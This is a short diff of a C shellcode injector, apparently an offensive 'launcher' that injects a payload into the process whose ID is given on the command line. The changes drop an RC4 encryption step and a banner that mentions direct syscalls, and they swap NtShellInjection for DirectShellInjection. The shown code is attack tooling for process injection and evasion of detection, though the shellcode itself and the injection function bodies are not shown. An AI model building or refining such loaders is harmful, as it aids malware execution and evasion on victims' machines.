@@ -40,9 +40,6 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    printf("[!!!] Initiating (Direct Syscalls) SKID Launcher!\n");
-
-
     for (int i = 0; i < sizeof(Shellcode); i++)
     {
         if (i % 16 == 0)
@@ -59,21 +56,11 @@ int main(int argc, char* argv[])
     INFO("Current Shellcode Address: %p", &Shellcode);
     INFO("Shellcode size: %zu bytes", sc_size);
 
-
-    CHAR("Encrypt Shellcode!\n");
-    getchar();
-
-    if (!EncryptRC4(Shellcode, sc_size))
-    {
-        WARN("Encryption Failed! Exiting...");
-        return -1;
-    }
-
     CHAR("Inject Payload!\n");
     getchar();
 
 
-    if (!NtShellInjection(atoi(argv[1]), Shellcode, Shellcode, sc_size))
+    if (!DirectShellInjection(atoi(argv[1]), Shellcode, Shellcode, sc_size))
     {
         WARN("Injection Failed! Exiting...");
         return -1;
